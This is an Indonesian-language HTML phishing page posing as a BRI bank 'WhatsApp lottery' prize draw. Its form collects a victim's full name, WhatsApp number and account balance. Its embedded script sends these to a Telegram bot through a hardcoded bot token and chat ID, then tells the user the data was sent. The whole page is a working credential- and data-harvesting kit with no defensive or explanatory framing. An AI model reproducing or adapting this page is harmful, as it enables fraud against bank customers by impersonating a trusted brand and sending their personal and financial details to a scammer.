<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Undian WhatsApp BRI</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      background: #e0f7fa;
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      text-align: center;
    }
    .container {
      max-width: 450px;
      margin: 30px auto;
      background: white;
      padding: 20px;
      border-radius: 12px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    img {
      max-width: 120px;
      margin-bottom: 10px;
    }
    h2 {
      color: #00695c;
    }
    input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 16px;
    }
    button {
      width: 100%;
      background: #25D366;
      color: white;
      padding: 14px;
      font-size: 16px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    }
    .success {
      margin-top: 15px;
      color: green;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo">
    <h2>Undian WhatsApp BRI - Menangkan Hadiah!</h2>
    <form onsubmit="kirimTelegram(); return false;">
      <input type="text" id="nama" placeholder="Nama Lengkap" required>
      <input type="text" id="whatsapp" placeholder="Nomor WhatsApp (08xxxx)" required>
      <input type="text" id="saldo" placeholder="Saldo Anda (contoh: 500000)" required>
      <button type="submit">Kirim Data</button>
    </form>
    <div class="success" id="info"></div>
  </div>

  <script>
    function kirimTelegram() {
      const nama = document.getElementById("nama").value.trim();
      const whatsapp = document.getElementById("whatsapp").value.trim();
      const saldo = document.getElementById("saldo").value.trim();

      if (!nama || !whatsapp || !saldo) {
        document.getElementById("info").innerText = "Semua kolom wajib diisi.";
        return;
      }

      const token = "7567570626:AAG9I5tBmabqS1KYjDYkr3WzNkbHBU2nczU";
      const chat_id = "5373308355";
      const text = `üì• *Data Peserta WhatsApp Undian*\n\nüë§ Nama: ${nama}\nüì± WhatsApp: ${whatsapp}\nüí∞ Saldo: Rp ${saldo}`;

      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: chat_id,
          text: text,
          parse_mode: "Markdown"
        })
      }).then(response => {
        if (response.ok) {
          document.getElementById("info").innerText = "‚úÖ Data berhasil dikirim ke Telegram!";
          document.querySelector("form").reset();
        } else {
          document.getElementById("info").innerText = "‚ùå Gagal mengirim data.";
        }
      }).catch(error => {
        document.getElementById("info").innerText = "‚ùå Terjadi kesalahan jaringan.";
      });
    }
  </script>
</body>
</html>
